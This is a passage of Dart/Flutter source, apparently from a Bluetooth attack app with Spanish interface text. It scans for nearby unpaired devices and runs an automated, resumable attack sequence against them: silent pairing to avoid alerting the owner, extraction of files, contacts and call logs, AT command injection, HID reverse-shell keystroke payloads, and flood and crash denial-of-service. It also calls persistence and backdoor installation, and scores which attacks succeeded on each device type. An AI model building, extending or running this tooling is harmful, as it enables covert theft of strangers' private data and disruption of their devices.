                      const SizedBox(height: 8),
                      Text('📥 $files | 📇 $contacts', style: const TextStyle(color: Colors.white70, fontSize: 11)),
                      Text('⚔️ ${attacks.isEmpty ? "Sin ataques" : attacks.join(", ")}', style: const TextStyle(color: Colors.cyanAccent, fontSize: 10)),
                      if (timestamp.isNotEmpty) Padding(padding: const EdgeInsets.only(top: 4), child: Text('🕐 $timestamp', style: const TextStyle(color: Colors.white38, fontSize: 9))),
                    ],
                  ),
                ),
              );
            },
          ),
        ),
        actions: [
          TextButton(onPressed: () { Navigator.pop(context); _clearAllReports(); }, child: const Text('LIMPIAR', style: TextStyle(color: Colors.redAccent))),
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('CERRAR', style: TextStyle(color: Colors.cyanAccent))),
        ],
      ),
    );
  }

  // Mostrar aprendizaje IA
  void _showAIlearning() async {
    if (!mounted) return;
    
    final deviceTypes = ['smartphone', 'iot', 'laptop', 'car', 'wearable', 'smart_lock'];
    final allLearning = <String, Map<String, int>>{};
    
    for (final type in deviceTypes) {
      final techniques = await _getLearnedTechniques(type);
      if (techniques.isNotEmpty) allLearning[type] = techniques;
    }
    
    if (!mounted) return;
    
    if (allLearning.isEmpty) {
      showDialog(
        context: context,
        builder: (dialogContext) => AlertDialog(
          backgroundColor: const Color(0xFF0F172A),
          title: const Row(children: [Icon(Icons.psychology, color: Colors.purpleAccent), SizedBox(width: 8), Text('APRENDIZAJE IA', style: TextStyle(color: Colors.white))]),
          content: const Text('No hay datos de aprendizaje.\nLa IA aprende al ejecutar ataques.', style: TextStyle(color: Colors.white70)),
          actions: [TextButton(onPressed: () { if (mounted) Navigator.pop(context); }, child: const Text('CERRAR', style: TextStyle(color: Colors.cyanAccent)))],
        ),
      );
      return;
    }
    
    if (!mounted) return;
    
    showDialog(
      context: context,
      builder: (dialogContext) => AlertDialog(
        backgroundColor: const Color(0xFF0F172A),
        title: const Row(children: [Icon(Icons.psychology, color: Colors.purpleAccent), SizedBox(width: 8), Text('APRENDIZAJE IA', style: TextStyle(color: Colors.white))]),
        content: SizedBox(
          width: double.maxFinite,
          height: 400,
          child: ListView.builder(
            shrinkWrap: true,
            itemCount: allLearning.length,
            itemBuilder: (context, i) {
              final entry = allLearning.entries.elementAt(i);
              final techniques = entry.value;
              final sorted = techniques.entries.toList()..sort((a, b) => b.value.compareTo(a.value));
              
              return Card(
                color: const Color(0xFF1E293B),
                margin: const EdgeInsets.only(bottom: 8),
                child: Padding(
                  padding: const EdgeInsets.all(12),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(children: [
                        Container(padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4), decoration: BoxDecoration(color: Colors.purpleAccent.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(4)), child: Text(entry.key.toUpperCase(), style: const TextStyle(color: Colors.purpleAccent, fontWeight: FontWeight.bold))),
                        const Spacer(),
                        Text('${techniques.values.fold(0, (a, b) => a + b)} éxitos', style: const TextStyle(color: Colors.greenAccent, fontSize: 10)),
                      ]),
                      const SizedBox(height: 8),
                      ...sorted.take(5).map((e) => Padding(padding: const EdgeInsets.only(bottom: 4), child: Row(children: [
                        Icon(e.value > 0 ? Icons.check_circle : Icons.cancel, color: e.value > 0 ? Colors.greenAccent : Colors.redAccent, size: 12),
                        const SizedBox(width: 8),
                        Expanded(child: Text(e.key, style: const TextStyle(color: Colors.white70, fontSize: 11))),
                        Text('${e.value}', style: const TextStyle(color: Colors.cyanAccent, fontSize: 11)),
                      ]))),
                    ],
                  ),
                ),
              );
            },
          ),
        ),
        actions: [
          TextButton(onPressed: () { if (mounted) { Navigator.pop(context); _clearAIlearning(); } }, child: const Text('LIMPIAR', style: TextStyle(color: Colors.redAccent))),
          TextButton(onPressed: () { if (mounted) Navigator.pop(context); }, child: const Text('CERRAR', style: TextStyle(color: Colors.cyanAccent))),
        ],
      ),
    );
  }

  void _clearAllReports() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('device_reports');
    _appendLog('🗑️ Reportes eliminados');
  }

  void _clearAIlearning() async {
    final prefs = await SharedPreferences.getInstance();
    for (final type in ['smartphone', 'iot', 'laptop', 'car', 'wearable', 'smart_lock']) {
      await prefs.remove('ai_learning_$type');
    }
    _appendLog('🗑️ Aprendizaje IA eliminado');
  }

  Widget _buildReportSection(String title, List<String> items) {
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(8),
      decoration: BoxDecoration(
        color: Colors.white10,
        borderRadius: BorderRadius.circular(8),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(title, style: const TextStyle(color: Colors.cyanAccent, fontWeight: FontWeight.bold, fontSize: 12)),
          const SizedBox(height: 4),
          ...items.map((item) => Text(item, style: const TextStyle(color: Colors.white70, fontSize: 11))),
        ],
      ),
    );
  }

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _tabController = TabController(length: 2, vsync: this);
    _initializeAI();
    _suggestionEngine.loadHistory();
    _restoreState(); // Restaurar estado si se salió por error

    // Comprobar si hay una sesión de modo automático interrumpida y reanudable.
    _loadResumableSession();

    // Wire service logs to terminal bar (append mode)
    RealExploitService.setExploitLogCallback((msg) => _appendLog(msg));

    if (widget.initialDevice != null) {
      final device = Map<String, dynamic>.from(widget.initialDevice!);
      _devices = [device];
      _selectedDevice = device;
      _discoveryData = {'devices': _devices, 'services': [], 'characteristics': []};
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (!mounted) return;
        _appendLog('OBJETIVO PRESELECCIONADO: ${device_utils.getDeviceDisplayName(device)}');
        _analyzeWithAI(device);
        _getSuggestion();
        _calculateSuccessRates();
      });
    }

    WidgetsBinding.instance.addPostFrameCallback((_) {
      context.read<BluetoothProvider>().initialize();
    });

    // Escuchar eventos de logs reales desde el hardware (EventChannel)
    _eventSubscription = RealExploitService.eventStream.listen((event) {
      if (!mounted) return;
      final msg = event['message']?.toString();
      if (msg == null) return;
      
      if (event['type'] == 'LOG') {
        _appendLog(msg);
      } else if (event['type'] == 'VULN') {
        _appendLog('⚠️ VULN: $msg');
      } else if (event['type'] == 'GATT_READ_DUMP' || event['type'] == 'GATT_NOTIFICATION') {
        // Show GATT data captures in the log
        _appendLog('📡 [${event['type']}] $msg');
      }
    });
  }

  Future<void> _initializeAI() async {
    await _heuristicEngine.initializeAll();
    if (mounted) _appendLog('MOTOR HEURÍSTICO ONLINE - ANÁLISIS POR SEÑALES REALES');
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _tabController.dispose();
    _logScrollController.dispose();
    _heuristicEngine.dispose();
    _suggestionEngine.saveHistory();
    _eventSubscription?.cancel();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    super.didChangeAppLifecycleState(state);
    // Al pausar/minimizar la app, persistir la sesión en curso (objetivo, tipo
    // y ataques ya completados) para poder reanudarla al volver a abrir.
    if (state == AppLifecycleState.paused ||
        state == AppLifecycleState.inactive ||
        state == AppLifecycleState.detached) {
      _persistResumableSession();
    }
  }

  /// Persiste la sesión del modo automático en curso para poder reanudarla.
  Future<void> _persistResumableSession() async {
    final addr = _selectedDevice?['address']?.toString() ?? _sessionDeviceAddress;
    if (addr.isEmpty) return;
    final prefs = await SharedPreferences.getInstance();
    prefs.setBool('unattended_resumable', _isUnattendedRunning);
    prefs.setString('unattended_address', addr);
    prefs.setString('unattended_name', _selectedDevice?['name']?.toString() ?? _sessionDeviceName);
    prefs.setString('unattended_type', _getDeviceType(_selectedDevice ?? {}));
    prefs.setString('unattended_done', _executedAttacks.join(','));
  }

  /// Carga una sesión interrumpida guardada previamente (si existe).
  Future<void> _loadResumableSession() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final addr = prefs.getString('unattended_address') ?? '';
      if (addr.isEmpty) return;
      _sessionDeviceAddress = addr;
      _sessionDeviceName = prefs.getString('unattended_name') ?? 'Unknown';
      _sessionDeviceType = prefs.getString('unattended_type') ?? 'unknown';
      final done = prefs.getString('unattended_done') ?? '';
      _sessionCompletedAttacks
        ..clear()
        ..addAll(done.split(',')..removeWhere((e) => e.isEmpty));
      final wasRunning = prefs.getBool('unattended_resumable') ?? false;
      setState(() => _sessionResumable = wasRunning && _sessionCompletedAttacks.isNotEmpty);
      if (_sessionResumable) {
        _appendLog('♻️ Hay una sesión automática interrumpida de ${_sessionDeviceName} ($_sessionDeviceAddress). '
            'Puedes reanudarla desde el HUD.');
      }
    } catch (_) {}
  }

  /// Reanuda una sesión interrumpida: reconstruye la secuencia del objetivo y
  /// ejecuta únicamente los ataques que no se completaron antes de salir.
  Future<void> _resumeSession() async {
    if (!_sessionResumable || _sessionDeviceAddress.isEmpty) {
      _appendLog('❌ No hay sesión reanudable disponible.');
      return;
    }
    if (_isUnattendedRunning) {
      _appendLog('⏳ El modo automático ya está en ejecución.');
      return;
    }
    _appendLog('♻️ REANUDANDO sesión automática de $_sessionDeviceName...');
    // Reconstruir el dispositivo objetivo desde la sesión guardada.
    final device = <String, dynamic>{
      'address': _sessionDeviceAddress,
      'name': _sessionDeviceName,
    };
    setState(() {
      _selectedDevice = device;
      _isUnattendedRunning = true;
      _sessionResumable = false;
    });

    final seq = _getAdaptiveAttackSequence(_sessionDeviceType);
    // Saltar ataques ya completados en la sesión anterior.
    final pending = seq
        .where((a) => !_sessionCompletedAttacks.contains(a['type']))
        .toList();
    if (pending.isEmpty) {
      _appendLog('✅ Todos los ataques de la sesión ya estaban completados.');
      setState(() => _isUnattendedRunning = false);
      return;
    }
    _appendLog('   ➕ Pendientes: ${pending.length} ataques.');
    try {
      await _executeParallelAttacks(device, pending);
    } catch (e) {
      _appendLog('💥 Error reanudando sesión: $e');
    }
    if (_stealthMode) {
      await _executeStealthMode(_sessionDeviceAddress, _sessionDeviceName);
    }
    setState(() => _isUnattendedRunning = false);
    // Sesión terminada: limpiar marca reanudable.
    final prefs = await SharedPreferences.getInstance();
    prefs.setBool('unattended_resumable', false);
    _appendLog('✅ Sesión automática reanudada y completada.');
  }

  bool _isUnbondedTarget(Map<String, dynamic> device) {
    if (device['bondState'] == 'Bonded' || device['isBonded'] == true) return false;
    if (device['deviceType'] == 'Bonded') return false;
    return true;
  }

  Future<void> _scan() async {
    if (mounted) {
      setState(() { _isScanning = true; _devices = []; });
    }
    _appendLog('📡 ESCANEANDO FRECUENCIAS (canal nativo Bluetooth)...');
    try {
      final btProvider = context.read<BluetoothProvider>();
      await btProvider.initialize();

      List<Map<String, dynamic>> scannedDevices = [];

      if (btProvider.isBluetoothEnabled) {
        final providerDevices = await btProvider.scanDevices(timeoutSeconds: 12);
        scannedDevices = providerDevices.map((d) => d.toMap()).toList();
        if (scannedDevices.isNotEmpty) {
          _appendLog('✅ Provider: ${scannedDevices.length} dispositivos detectados');
        }
      } else {
        _appendLog('⚠️ Bluetooth desactivado en provider');
      }

      if (scannedDevices.isEmpty) {
        _appendLog('↪️ Fallback: escaneo vía exploit_integration...');
        final result = await _exploitService.startScan();
        if (result['success'] == true && result['devices'] != null) {
          scannedDevices = (result['devices'] as List)
              .map((d) => Map<String, dynamic>.from(d as Map))
              .toList();
        } else {
          _appendLog('❌ FALLO EN ESCANEO: ${result['message'] ?? 'sin dispositivos'}');
        }
      }

      if (mounted) {
        setState(() {
          _isScanning = false;
          _devices = scannedDevices.where(_isUnbondedTarget).toList();
          if (_devices.isNotEmpty) {
            _appendLog('✅ DETECTADOS: ${_devices.length} OBJETIVOS');
            _selectedDevice = _devices.first;
            _discoveryData = {'devices': _devices, 'services': [], 'characteristics': []};
            _analyzeWithAI(_devices.first);
            _getSuggestion();
            _calculateSuccessRates();
          } else {
            _appendLog('❌ SIN SEÑALES DETECTADAS');
          }
        });
      }
    } catch (e) {
      if (mounted) {
        setState(() => _isScanning = false);
        _appendLog('💥 ERROR CRÍTICO: $e');
      }
    }
  }

  void _calculateSuccessRates() {
    final rates = <String, double>{};
    for (var type in ['hid', 'btlejack', 'dos']) {
      final stats = _suggestionEngine.getStatsForType(type);
      // Show real success rate, or 0.5 (unknown) if no history
      rates[type] = stats.total > 0 ? stats.successRate / 100.0 : 0.5;
    }
    if (mounted) setState(() => _successRates = rates);
  }

  Future<void> _analyzeWithAI(Map<String, dynamic> device) async {
    try {
      final analysis = await _heuristicEngine.identifyAndOptimize(device);
      if (mounted) {
        setState(() { 
          _aiPrediction = 'Análisis: ${analysis['recommendedAttack']} (${analysis['successProbability']}%)'; 
          _calculateSuccessRates(); 
        });
      }
    } catch (e) { if (mounted) setState(() => _aiPrediction = 'Análisis: NO DISPONIBLE'); }
  }

  void _getSuggestion() {
    if (_selectedDevice == null) return;
    if (mounted) {
      final deviceType = _getDeviceType(_selectedDevice!);

      final mlRecommendation = _smartRecommendation.recommend(
        deviceType: deviceType,
        executedTypes: _executedAttacks.toSet(),
        successHistory: _learnedTechniques,
        excludedTypes: _executedAttacks,
      );

      final ruleSuggestion = _suggestionEngine.suggestNextAttack(
        deviceType: deviceType,
        deviceName: _selectedDevice!['name'] ?? 'Unknown',
        excludedTypes: _executedAttacks,
      );

      setState(() {
        _currentSuggestion = mlRecommendation.confidence >= ruleSuggestion.confidence
            ? Suggestion(
                type: mlRecommendation.type,
                command: mlRecommendation.command,
                confidence: mlRecommendation.confidence,
                reason: mlRecommendation.reason,
                alternativeReason: mlRecommendation.alternativeReason,
              )
            : ruleSuggestion;
      });
    }
  }

  Map<String, int> _learnedTechniques = {};

  // Guía rápida del ataque sugerido
  String _getQuickGuide() {
    if (_currentSuggestion == null) return 'Toca RADAR → ESCANEAR → selecciona dispositivo';
    final type = _currentSuggestion!.type;
    final cmd = _currentSuggestion!.command ?? '';
    String tab = 'IA/VA';
    if (type == 'btlejack') tab = 'BTLE';
    if (type == 'dos') tab = 'DOS';
    if (type == 'hid' || type == 'hid_script') tab = 'HID';
    if (type == 'sdp_discover' || type == 'sdp' || type == 'bypass' || type == 'blueborne' || type == 'full_scan') tab = 'IA/VA';
    if (type == 'file_exfil' || type == 'obex_scan' || type == 'pbap_extract') tab = 'IA/VA';
    
    // Mapear comando interno a etiqueta del botón visible
    String btnLabel = cmd;
    if (cmd == 'notepad') btnLabel = 'WINDOWS: NOTEPAD';
    if (cmd == 'wifi') btnLabel = 'WINDOWS: WIFI';
    if (cmd == 'terminal') btnLabel = 'MACOS: TERMINAL';
    if (cmd == 'reverse') btnLabel = 'LINUX: REVERSE';
    if (cmd == 'gatt_flood') btnLabel = 'GATT FLOOD';
    if (cmd == 'l2cap_flood') btnLabel = 'L2CAP FLOOD';
    if (cmd == 'mtu_crash') btnLabel = 'MTU CRASH';
    if (cmd == 'quick_connect') btnLabel = 'QUICK CONNECT RACE';
    if (cmd == 'scan' && type == 'sdp_discover') btnLabel = 'SDP DISCOVER';
    if (cmd == 'contacts' && type == 'pbap_extract') btnLabel = 'EXTRAER CONTACTOS';
    
    return '▶ Toca aquí → ir a $tab → "$btnLabel"';
  }

  // Navegar a la pestaña sugerida al tocar el hint
  void _navigateToSuggestion() {
    if (_currentSuggestion == null) return;
    _tabController.animateTo(1);
  }

  // Procesar un dispositivo en modo desatendido
  Future<Map<String, dynamic>> _processDeviceUnattended(Map<String, dynamic> device, int index, int total) async {
    final displayName = device_utils.getDeviceDisplayName(device);
    final address = device['address'] ?? '';
    final deviceType = device_utils.detectDeviceType(device).toLowerCase();

    _appendLog('');
    _appendLog('═══════════════════════════════════');
    _appendLog('🎯 OBJETIVO $index/$total: $displayName');
    _appendLog('📍 MAC: $address');
    _appendLog('📱 Tipo detectado: $deviceType');
    _appendLog('═══════════════════════════════════');

    setState(() {
      _selectedDevice = device;
      _executedAttacks = [];
    });

    int deviceFiles = 0;
    int deviceContacts = 0;
    int deviceAppData = 0;
    final deviceAttacks = <String>[];
    final deviceResults = <String, dynamic>{};

    // ===== FASE 0: PREDICCIÓN CON IA =====
    if (_enableAdaptiveIntelligence && _selectedDevice != null) {
      _appendLog('🧠 FASE 0: PREDICCIÓN CON IA');
      try {
        final prediction = await _predictVulnerabilities(address);
        if (prediction.isNotEmpty) {
          final successProb = prediction['success_probability'] ?? 0.0;
          final highRisk = prediction['high_risk_vulns'] as List? ?? [];
          _appendLog('   📊 Probabilidad de éxito: ${(successProb * 100).toStringAsFixed(1)}%');
          _appendLog('   ⚠️ Vulnerabilidades de alto riesgo: ${highRisk.length}');
          if (highRisk.isNotEmpty) {
            _appendLog('   🎯 Objetivos prioritarios: ${highRisk.take(3).join(", ")}');
          }
          deviceResults['prediction'] = prediction;
        }
      } catch (e) {
        _appendLog('   ⚠️ Predicción IA no disponible: $e');
      }
    }

    // ===== EJECUCIÓN ADAPTATIVA DE ATAQUES =====
    List<Map<String, dynamic>> attackSequence;
    
    if (_enableAdaptiveIntelligence) {
      // Intentar obtener estrategia basada en reportes previos
      final savedReport = await _loadDeviceReport(address);
      if (savedReport != null && savedReport['success'] == true) {
        _appendLog('   📊 Usando estrategia previa exitosa...');
        attackSequence = _getAdaptiveAttackSequence(deviceType);
      } else {
        attackSequence = await _getLearnedStrategy(deviceType);
      }
    } else {
      attackSequence = _getAdaptiveAttackSequence(deviceType);
    }

    _appendLog('📋 Secuencia: ${attackSequence.length} técnicas');
    deviceResults['deviceType'] = deviceType;

    // Ejecutar secuencia adaptativa (con paralelización por fases)
    await _executeParallelAttacks(device, attackSequence);
    
    // Si hay archivos extraídos, contarlos
    if (_obexFiles.isNotEmpty) deviceFiles = _obexFiles.length;
    if (_pbapContacts.isNotEmpty) deviceContacts = _pbapContacts.length;

    // Resumen por dispositivo
    _appendLog('');
    _appendLog('✅ Objetivo $displayName completado');
    _appendLog('   📥 Archivos: $deviceFiles');
    _appendLog('   📇 Contactos: $deviceContacts');
    _appendLog('   ⚔️ Ataques intentados: ${deviceAttacks.length}');
    _appendLog('   ⚡ Éxitos: ${deviceAttacks.length}');
    _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    // Guardar reporte de este dispositivo
    deviceResults['files'] = deviceFiles;
    deviceResults['contacts'] = deviceContacts;
    deviceResults['appData'] = deviceAppData;
    deviceResults['attacks'] = deviceAttacks;
    deviceResults['timestamp'] = DateTime.now().toIso8601String();
    deviceResults['success'] = deviceAttacks.isNotEmpty;

    await _saveDeviceReport(address, deviceResults);
    
    // Guardar aprendizaje de la IA
    if (deviceAttacks.isNotEmpty) {
      await _saveAIlearning(deviceType, deviceAttacks, deviceAttacks.isNotEmpty);
    }

    return deviceResults;
  }

  Future<Map<String, dynamic>> _getRootStatus() async {
    try {
      return await RealExploitService.getRootStatus();
    } catch (e) {
      return {'rootAvailable': false, 'error': e.toString()};
    }
  }

  /// Convierte recomendaciones ML (vuln:X, btlejack:Y) en técnicas de ataque
  List<Map<String, dynamic>> _techniquesFromMlExploits(List<String> exploits) {
    final techniques = <Map<String, dynamic>>[];
    for (final exploit in exploits) {
      Map<String, dynamic>? technique;
      if (exploit.startsWith('btlejack:')) {
        technique = {
          'type': 'btlejack',
          'command': exploit.split(':').last,
          'name': exploit.toUpperCase(),
          'phase': 3,
        };
      } else if (exploit.startsWith('vuln:')) {
        final vuln = exploit.replaceFirst('vuln:', '');
        technique = switch (vuln) {
          'obex_put' => {'type': 'file_exfil', 'command': 'scan', 'name': 'ML_OBEX', 'phase': 2},
          'ftp_anonymous' => {'type': 'file_exfil_dir', 'command': 'Download', 'name': 'ML_FTP', 'phase': 2},
          'ble_reconnection' => {'type': 'ble_pairing', 'command': 'justworks', 'name': 'ML_BLE_RECONN', 'phase': 3},
          'no_pairing_auth' => {'type': 'bypass', 'command': 'quick_connect', 'name': 'ML_BYPASS', 'phase': 5},
          'at_command_injection' => {'type': 'at_injection', 'name': 'ML_AT', 'phase': 4},
          'sdp_information_leak' => {'type': 'sdp_enumerate', 'command': 'all', 'name': 'ML_SDP', 'phase': 1},
          _ => {'type': 'full_scan', 'name': 'ML_$vuln', 'phase': 1},
        };
      } else {
        technique = allAttackTechniques.cast<Map<String, dynamic>?>().firstWhere(
          (t) => t?['name'] == exploit || t?['type'] == exploit,
          orElse: () => {'type': exploit, 'name': exploit, 'phase': 2},
        );
      }
      if (technique != null) techniques.add(technique);
    }
    return techniques;
  }

  /// FASE 0.5: Sistema avanzado unificado (recon profundo + multi-vector + ML + exfil)
  Future<Map<String, dynamic>> _runAdvancedSystemPhase(String address) async {
    _appendLog('🚀 [FASE 0.5] Sistema avanzado unificado...');
    try {
      _appendLog('   ⏳ Ejecutando ataque avanzado...');
      final result = await _advancedSystem.executeAdvancedAttack(
        address,
        config: AdvancedAttackConfig(
          enablePersistence: _enablePersistence,
          enableZeroDay: true,
          enableEvasion: !_stealthMode,
          enableIntelligentExfiltration: true,
          maxExfiltrationFiles: MAX_FILES_PER_DIR,
        ),
      ).timeout(const Duration(seconds: 90), onTimeout: () {
        _appendLog('   ⏰ Timeout fase 0.5 (>90s). Continuando sin sistema avanzado.');
        return AdvancedAttackResult(
          success: false,
          fingerprint: null,
          attackResult: null,
          persistenceResult: null,
          exfiltrationResult: null,
          duration: const Duration(seconds: 90),
        );
      });

      _advancedAttackResult = result.toJson();

      final fp = result.fingerprint;
      if (fp != null) {
        _reconnaissanceResults = fp.toJson();
        _appendLog('   🔬 Recon: ${fp.sdpServices.length} servicios SDP, '
            '${fp.bleServices.length} BLE, superficie ${fp.attackSurface}');
        if (fp.knownVulnerabilities.isNotEmpty) {
          _appendLog('   ⚠️ ${fp.knownVulnerabilities.length} vulnerabilidades conocidas');
        }
      }

      final mv = result.attackResult;
      if (mv != null) {
        final vectors = mv.successfulVectors.map((v) => v.vector).join(', ');
        _appendLog('   ⚔️ Multi-vector: ${mv.success ? "OK" : "parcial"} '
            '(${mv.successfulVectors.length} vectores: $vectors)');
      }

      final strategy = result.strategy;
      if (strategy != null && strategy.recommendedExploits.isNotEmpty) {
        _appendLog('   🧠 Estrategia: ${strategy.recommendedExploits.join(", ")} '
            '(éxito esperado ${(strategy.expectedSuccess * 100).toStringAsFixed(0)}%)');
      }

      final exfil = result.exfiltrationResult;
      if (exfil != null && exfil.filesExfiltrated > 0) {
        _appendLog('   📤 Exfiltración inteligente: ${exfil.filesExfiltrated}/${exfil.totalFiles} archivos');
        _collectedData.add('📤 [ADVANCED] ${exfil.filesExfiltrated} archivos exfiltrados');
      }

      final persist = result.persistenceResult;
      if (persist != null && persist.success) {
        final okMethods = persist.methods.entries.where((e) => e.value).map((e) => e.key);
        _appendLog('   🕵️ Persistencia: ${okMethods.join(", ")}');
        _installedBackdoors.add({
          'address': address,
          'type': 'unified_advanced_system',
          'methods': persist.methods,
          'timestamp': DateTime.now().toIso8601String(),
        });
      }

      _appendLog(result.success
          ? '   ✅ Sistema avanzado: éxito (${result.duration.inSeconds}s)'
          : '   ⚠️ Sistema avanzado: sin acceso completo (${result.duration.inSeconds}s)');

      return result.toJson();
    } catch (e) {
      _appendLog('   ❌ Sistema avanzado falló: $e');
      return {'success': false, 'error': e.toString()};
    }
  }

  /// Inserta técnicas ML al inicio de la secuencia sin duplicar tipos
  List<Map<String, dynamic>> _mergeAttackSequence(
    List<Map<String, dynamic>> base,
    List<Map<String, dynamic>> mlTechniques,
  ) {
    if (mlTechniques.isEmpty) return base;
    final existingTypes = base.map((t) => '${t['type']}:${t['command'] ?? ""}').toSet();
    final merged = <Map<String, dynamic>>[];
    for (final t in mlTechniques) {
      final key = '${t['type']}:${t['command'] ?? ""}';
      if (!existingTypes.contains(key)) {
        merged.add(t);
        existingTypes.add(key);
      }
    }
    merged.addAll(base);
    return merged;
  }

  // ====== MODO DESATENDIDO MEJORADO ======
  // EJECUTA TODOS los exploits disponibles con reintentos y logs
  // VERSIÓN MEJORADA CON TODAS LAS MEJORAS INTEGRADAS
  Future<void> _startUnattendedMode() async {
    try {
    if (_isUnattendedRunning) {
      setState(() => _isUnattendedRunning = false);
      _appendLog('🛑 MODO DESATENDIDO CANCELADO');
      return;
    }

    // OBLIGATORIO: Debe haber un dispositivo seleccionado
    if (_selectedDevice == null) {
      _appendLog('❌ Selecciona un dispositivo primero.');
      return;
    }

    // Reiniciar estados de sesión reanudable al comenzar de cero.
    _sessionResumable = false;
    _sessionCompletedAttacks.clear();
    setState(() {});

    final targetAddress = _selectedDevice!['address'] ?? '';
    final targetName = _selectedDevice!['name'] ?? 'Unknown';
    
    setState(() => _isUnattendedRunning = true);
    _appendLog('╔══════════════════════════════════════╗');
    _appendLog('║   🤖 MODO DESATENDIDO MEJORADO       ║');
    _appendLog('║   + IA Adaptativa + Análisis         ║');
    _appendLog('╚══════════════════════════════════════╝');
    _appendLog('🎯 Objetivo: $targetName');
    _appendLog('📍 MAC: $targetAddress');
    _appendLog('🔍 Verificando acceso ROOT...');
    try {
      final rootStatus = await _getRootStatus();
      if (rootStatus['rootAvailable'] == true) {
        _appendLog('🔓 ✅ ROOT DISPONIBLE');
        if (rootStatus['hciToolAvailable'] == true) {
          _appendLog('   hcitool: ✅ disponible');
          _appendLog('   Dispositivos HCI: ${(rootStatus['hciDevices'] as List?)?.join(", ") ?? "N/A"}');
        } else {
          _appendLog('   hcitool: ❌ NO disponible (exploits L2CAP raw no funcionarán)');
        }
      } else {
        _appendLog('🔒 ❌ ROOT NO DISPONIBLE');
        _appendLog('   ⚠️ Los exploits marcados como "REQUIERE ROOT" se saltarán');
        _appendLog('   📱 Rootea el dispositivo o usa un emulador con root');
      }
    } catch (_) {
      _appendLog('🔍 ❌ No se pudo verificar root');
    }
    _appendLog('⚙️ Configuración:');
    _appendLog('   • Ejecución paralela: ${_enableParallelExecution ? "ON" : "OFF"}');
    _appendLog('   • IA adaptativa: ${_enableAdaptiveIntelligence ? "ON" : "OFF"}');
    _appendLog('   • Sistema avanzado: ${_enableAdvancedSystem ? "ON" : "OFF"}');
    _appendLog('   • Análisis de patrones: ${_enablePatternAnalysis ? "ON" : "OFF"}');
    _appendLog('   • Análisis de red: ${_enableNetworkAnalysis ? "ON" : "OFF"}');
    _appendLog('   • Modo sigiloso: ${_stealthMode ? "ON" : "OFF"}');
    _appendLog('   • Persistencia: ${_enablePersistence ? "ON" : "OFF"}');
    _appendLog('   • Bonding automático: ${_autoBonding ? "ON" : "OFF (objetivo no emparejado)"}');
    _appendLog('⏱️ Duración estimada: ~5 min');
    _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    // Process selected device(s)
    final _selectedDevices = [_selectedDevice!];
    
    for (final device in _selectedDevices) {
      final address = device['address'] ?? '';
      final displayName = device_utils.getDeviceDisplayName(device);
      
      _appendLog('');
      _appendLog('🎯 Iniciando modo automático en $displayName');
      _appendLog('📍 MAC: $address');
      
      try {
        // Reset per-device state
        setState(() {
          _selectedDevice = device;
          _executedAttacks = [];
          _obexFiles = [];
          _pbapContacts = [];
          _pbapCalls = [];
          _blueBorneResults.clear();
          _gattMirrorResults.clear();
          _fullScanResults.clear();
          _atInjectionResults.clear();
          _attackDiagnostics.clear();
        });

        // === FASE -2: EMPAREJAMIENTO (BONDING) — OPCIONAL ===
        // Por defecto DESACTIVADO: se asume que el objetivo NO está emparejado y que
        // un diálogo de pareo en su pantalla delataría la auditoría. Las técnicas que
        // funcionan sin bonding (SDP, BLE scan/GATT abierto, L2CAP con root, OBEX legacy)
        // se ejecutan igualmente; si la extracción falla por falta de pareo, el
        // DIAGNÓSTICO lo indicará y podrás activar el toggle en el menú ⋮.
        if (_autoBonding) {
          try {
            _appendLog('🤫 [FASE -2] Intentando EMPAREJAMIENTO SILENCIOSO...');
            final sp = await RealExploitService.silentBonded(address);
            final method = sp['method']?.toString() ?? '?';
            final msg = (sp['message'] ?? sp['error'] ?? 'sin detalle').toString();
            if (sp['success'] == true) {
              _appendLog('   ✅ $msg');
              _collectedData.add('🤫 [$displayName] Emparejamiento silencioso OK ($method)');
              if (mounted) setState(() {});
              _saveState();
            } else {
              _appendLog('   ⚠️ Silencioso falló ($method): $msg');
              // Fallback honesto: pareo normal SOLO si el usuario activó el toggle
              _appendLog('   🤝 Reintentando con bonding estándar (puede mostrar diálogo en el objetivo)...');
              final bonded = await RealExploitService.ensureBonded(address);
              _appendLog(bonded
                  ? '   ✅ Objetivo emparejado vía bonding estándar'
                  : '   ❌ Bonding no completado');
            }
          } catch (e) {
            _appendLog('   ⚠️ Emparejamiento no disponible: $e');
          }
        } else {
          _appendLog('🤵 [FASE -2] Bonding automático OFF — objetivo tratado como NO emparejado');
        }

        // === FASE -1: RECONOCIMIENTO PROACTIVO ===
        if (_proactiveRecon) {
          _appendLog('🔍 [FASE -1] Reconocimiento proactivo...');
          _reconnaissanceResults = await _proactiveReconnaissance(address);
          _appendLog('   📊 Dispositivo: $_reconnaissanceResults');
        }
        
          // === FASE 0: ANÁLISIS HEURÍSTICO (señales reales del dispositivo) ===
          _appendLog('🤖 [FASE 0] Análisis heurístico...');
          final deviceType = _getDeviceType(device);

          if (_enableAdaptiveIntelligence) {
            try {
              final prediction = await _heuristicEngine.assessVulnerabilities(address, device);
              _appendLog('   🔬 Heurística: ${prediction.cveCount} señales, riesgo ${prediction.overallRiskLevel}');
              if (prediction.vulnerabilities.isNotEmpty) {
                _appendLog('   🎯 Top: ${prediction.vulnerabilities.first.id} (${(prediction.vulnerabilities.first.confidence * 100).toStringAsFixed(0)}%)');
                _appendLog('   💡 Acción: ${prediction.recommendedAction}');
              }
            } catch (_) {}
          }

          // Usar estrategia aprendida si está disponible, sino por defecto
          List<Map<String, dynamic>> attackSequence;
          if (_enableAdaptiveIntelligence) {
            final learned = await _getLearnedTechniques(deviceType);
            if (learned.isNotEmpty) {
              attackSequence = await _getWeightedStrategy(deviceType);
